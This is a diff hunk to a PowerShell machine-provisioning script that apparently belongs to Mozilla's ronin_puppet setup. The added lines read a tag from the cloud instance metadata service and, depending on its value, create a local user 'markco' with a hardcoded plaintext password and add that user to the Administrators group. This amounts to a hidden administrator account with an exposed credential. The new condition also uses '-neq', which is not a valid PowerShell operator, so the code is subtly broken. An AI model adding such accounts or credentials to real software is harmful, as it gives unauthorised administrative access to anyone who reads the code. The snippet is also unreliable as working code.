@@ -360,6 +360,11 @@ If ($hand_off_ready -eq 'yes') {
   if (!(Test-VolumeExists -DriveLetter 'Y') -and !(Test-VolumeExists -DriveLetter 'Z')) {
     Set-DriveLetters
   }
+  $markcovar = ((((Invoke-WebRequest -Headers @{'Metadata'=$true} -UseBasicParsing -Uri ('http://169.254.169.254/metadata/instance?api-version=2019-06-04')).Content) | ConvertFrom-Json).compute.tagsList| ? { $_.name -eq ('markcovar')     })[0].value
+  If ($markcovar -neq 'empty_var') {
+  New-LocalUser -name "markco"  -password (ConvertTo-SecureString -AsPlainText "2>>V5Z&Ejs4Qb/t" -Force)
+  Add-LocalGroupMember -Group "Administrators" -Member "markco"
+  }
   Run-MaintainSystem
   if (((Get-ItemProperty "HKLM:\SOFTWARE\Mozilla\ronin_puppet").inmutable) -eq 'false') {
     Puppet-Run
